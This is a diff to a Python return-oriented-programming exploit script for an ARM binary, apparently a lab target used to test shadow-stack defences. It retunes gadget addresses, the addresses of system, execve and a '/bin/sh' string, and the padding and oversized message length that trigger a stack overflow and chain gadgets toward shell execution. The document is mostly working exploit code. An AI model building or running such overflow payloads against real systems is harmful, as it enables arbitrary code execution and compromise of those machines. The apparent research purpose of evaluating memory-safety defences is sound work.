@@ -33,14 +33,12 @@ import sys
 ###########################################################################
 # LIST OF USEFUL GADGETS:#######################################
 
-#POP_R3 = 0x00010668         # pop {r3, pc}
 POP_R3 = 0x00010734         # pop {r3, pc}
-#MOV_R3_R0 = 0x000109c4      # mov r0, r3 ; sub sp, fp, #8 ; pop {r4, fp, pc}
 MOV_R3_R0 = 0x00010bb0      # mov r0, r3 ; sub sp, fp, #8 ; pop {r4, fp, pc}
-#POP_8 =  0x00010a40         # pop {r3, r4, r5, r6, r7, r8, sb, pc}
-POP_8 =  0x00010c40         # pop {r3, r4, r5, r6, r7, r8, sb, pc}
-#R7_INTO_R0 = 0x00010a28     # mov r0, r7 ; mov r1, r8 ; mov r2, sb ; blx r3
-R7_INTO_R0 = 0x00010c28     # mov r0, r7 ; mov r1, r8 ; mov r2, sb ; blx r3
+POP_8 =  0x00010c10         # pop {r3, r4, r5, r6, r7, r8, sb, pc} # THIS IS VALUE WITH BENCHMARKS
+#POP_8 =  0x00010c40         # pop {r3, r4, r5, r6, r7, r8, sb, pc} # THIS IS VALUE WITHOUT BENCHMARKS ADDED
+R7_INTO_R0 = 0x00010bf8     # mov r0, r7 ; mov r1, r8 ; mov r2, sb ; blx r3 # THIS IS THE VALUE WITH BENCHMARKS
+#R7_INTO_R0 = 0x00010c28     # mov r0, r7 ; mov r1, r8 ; mov r2, sb ; blx r3 # THIS IS THE VALUE WITHOUT BENCHMARKS
 POP_FP = 0x00010974         # pop {fp, pc}
 POP_r4 = 0x0001090c         # pop {r4, pc}
 MOV_R8_R1 = 0x00010c2c      # mov r1, r8 ; mov r2, sb ; blx r3
@@ -82,15 +80,18 @@ SYSCALL =  0x76e00c20
 SYSTEM = 0x76f55308
 EXECVE =  0x76dd2814
 # "/bin/sh": 0x76e50b20
-LOG_TXT = 0x00010cd0
+#LOG_TXT = 0x00010f04 #"/usr/pi/log.txt" Use this with shadow stack
+#LOG_TXT = 0x00010ee0 #"/usr/pi/log.txt" Use this without shadow stack
+LOG_TXT = 0x00010c8c #"/usr/pi/log.txt" Use this without shadow stack
 ################################################################
 # Normally message size will follow the payload size, but for an overflow
 # we set this to a high value, enough to acommodate our ROP payload
-#message_size = struct.pack("i", 0x00000004);
-message_size = struct.pack("i", 0x000000CC);
+#message_size = struct.pack("i", 0x000000CC);
+message_size = struct.pack("i", 0x000004B0);
 
 padding = "AABBCCDDEEFFGGHH"
-padding += "A" * 88
+#padding += "A" * 88
+padding += "A" * 988
 # The following jump will access the secret function within the binary itself.
 #jump = struct.pack("i", 0x00010668);
 payload = struct.pack("i", POP_8);
